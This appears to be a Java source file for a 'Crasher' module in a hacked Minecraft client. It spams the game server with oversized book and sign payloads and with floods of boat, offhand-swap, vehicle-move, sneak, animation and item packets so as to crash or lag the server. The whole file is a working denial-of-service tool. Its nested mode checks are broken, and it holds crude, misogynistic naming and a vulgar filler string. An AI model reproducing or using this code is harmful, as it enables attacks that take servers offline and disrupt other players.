package fail.mercury.client.client.modules.misc;

import fail.mercury.client.api.module.Module;
import fail.mercury.client.api.module.annotations.ModuleManifest;
import fail.mercury.client.api.module.category.Category;
import fail.mercury.client.api.util.ChatUtil;
import fail.mercury.client.api.util.Util;
import fail.mercury.client.client.events.UpdateEvent;
import me.kix.lotus.property.annotations.Mode;
import me.kix.lotus.property.annotations.Property;
import net.b0at.api.event.EventHandler;
import net.minecraft.client.gui.GuiDisconnected;
import net.minecraft.client.gui.GuiDownloadTerrain;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.gui.GuiMultiplayer;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.entity.Entity;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.*;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.ITextComponent;

/**
 * @author Crystallinqq on 2/2/2020
 */
@ModuleManifest(label = "Crasher", aliases = {"BaldCrash"}, category = Category.MISC)

public class Crasher extends Module {
    private ITextComponent line1;
    private ITextComponent line2;
    private ITextComponent line3;
    private ITextComponent line4;
    private ITextComponent[] ohgodohfuck;
    private String color;

    @Property("Mode")
    @Mode({"Book", "BookBypass", "Sign", "Boat", "Offhand", "Entity", "Sneak", "Unnamed", "HitWomen", "ItemSwitch", "ItemUse"})
    public String mode = "Book";

    @Property("Toggle")
    public boolean toggle = true;

    private ItemStack bookObj = null;
    private String message = "ihavesexwithauto!!b54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";

    @Override
    public void onEnable() {
        //bru
        color = "red";
        line1 = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
        line2 = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
        line3 = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
        line4 = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
        ohgodohfuck = new ITextComponent[]{line1, line2, line3, line4};

        this.bookObj = new ItemStack(Items.WRITABLE_BOOK);
        NBTTagList list = new NBTTagList();
        NBTTagCompound tag = new NBTTagCompound();
        String author = mc.getSession().getUsername();
        String title = "\n MercuryOnTop \n";
        String size = this.message;
        for (int i = 0; i < 50; ++i) {
            NBTTagString tString = new NBTTagString(size);
            list.appendTag(tString);
        }
        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", list);
        this.bookObj.setTagInfo("pages", list);
        this.bookObj.setTagCompound(tag);
        if (mode.equalsIgnoreCase("Book")) {
            while (this.isEnabled()) {
                try {
                    Util.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short) 0));
                    Thread.sleep(12L);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            if (mode.equalsIgnoreCase("BookBypass")) {
                while (this.isEnabled()) {
                    try {
                        Util.sendPacket(new CPacketCreativeInventoryAction(36, bookObj));
                        Thread.sleep(12L);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                if (mode.equalsIgnoreCase("Sign")) {
                    while (this.isEnabled()) {
                        try {
                            Util.sendPacket(new CPacketUpdateSign(mc.player.getPosition(), ohgodohfuck));
                            Thread.sleep(12L);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
            if (mode.equalsIgnoreCase("Boat")) {
                for (int i = 0; i < 100; ++i) {
                    while (this.isEnabled()) {
                        try {
                            mc.player.connection.sendPacket(new CPacketSteerBoat(true, true));
                            Thread.sleep(12L);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
                if (mode.equalsIgnoreCase("Offhand")) {
                    try {
                        for (int i = 1; i <= 2000; ++i) {
                            mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, EnumFacing.DOWN));
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                        this.toggle();
                    }
                    if (mode.equalsIgnoreCase("Entity")) {
                        while (this.isEnabled()) {
                            try {
                        final Entity ridingEntity = mc.player.getRidingEntity();
                        if (ridingEntity == null) {
                            ChatUtil.print("Entity lag requires player to be on an entity");
                            this.setEnabled(false);
                            return;
                        }
                        ridingEntity.posX = mc.player.posX;
                        ridingEntity.posY = mc.player.posY + 1330.0;
                        ridingEntity.posZ = mc.player.posZ;
                        mc.player.connection.sendPacket(new CPacketVehicleMove(ridingEntity));
                        Thread.sleep(12L);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                    }
                    if (mode.equalsIgnoreCase("Sneak")) {
                        while (this.isEnabled()) {
                            try {
                        Util.sendPacket(new CPacketEntityAction(mc.player, CPacketEntityAction.Action.START_SNEAKING));
                        Util.sendPacket(new CPacketEntityAction(mc.player, CPacketEntityAction.Action.STOP_SNEAKING));
                        Thread.sleep(12L);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                    }
                }
                if (mode.equalsIgnoreCase("Unnamed")) {
                    while (this.isEnabled()) {
                        try {
                    mc.playerController.windowClick(0, 0, 0, ClickType.PICKUP_ALL, mc.player);
                    Thread.sleep(12L);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
                }
                if (mode.equalsIgnoreCase("HitWomen")) {
                    while (this.isEnabled()) {
                        try {
                            Util.sendPacket(new CPacketAnimation(EnumHand.MAIN_HAND));
                            Thread.sleep(12L);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
                if (mode.equalsIgnoreCase("ItemSwitch")) {
                    while (this.isEnabled()) {
                        try {
                        Util.sendPacket(new CPacketHeldItemChange(0));
                        Util.sendPacket(new CPacketHeldItemChange(1));
                        Thread.sleep(12L);
                    } catch(InterruptedException e){
                        e.printStackTrace();
                    }
                }
            }
        }
                if (mode.equalsIgnoreCase("ItemUse")) {
                    while (this.isEnabled()) {
                        try {
                            Util.sendPacket(new CPacketPlayerTryUseItem());
                            Util.sendPacket(new CPacketPlayerTryUseItemOnBlock(mc.player.getPosition(), mc.player.getHorizontalFacing(), mc.player.getActiveHand(), 0.0f, 0.0f, 0.0f));
                            Thread.sleep(12L);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }

        @EventHandler
        public void onUpdate (UpdateEvent event){
            if (toggle) {
                if (mc.currentScreen instanceof GuiMainMenu ||
                        mc.currentScreen instanceof GuiDisconnected ||
                        mc.currentScreen instanceof GuiDownloadTerrain ||
                        mc.currentScreen instanceof GuiConnecting ||
                        mc.currentScreen instanceof GuiMultiplayer) {
                    this.toggle();
                }
            }
        }
    }
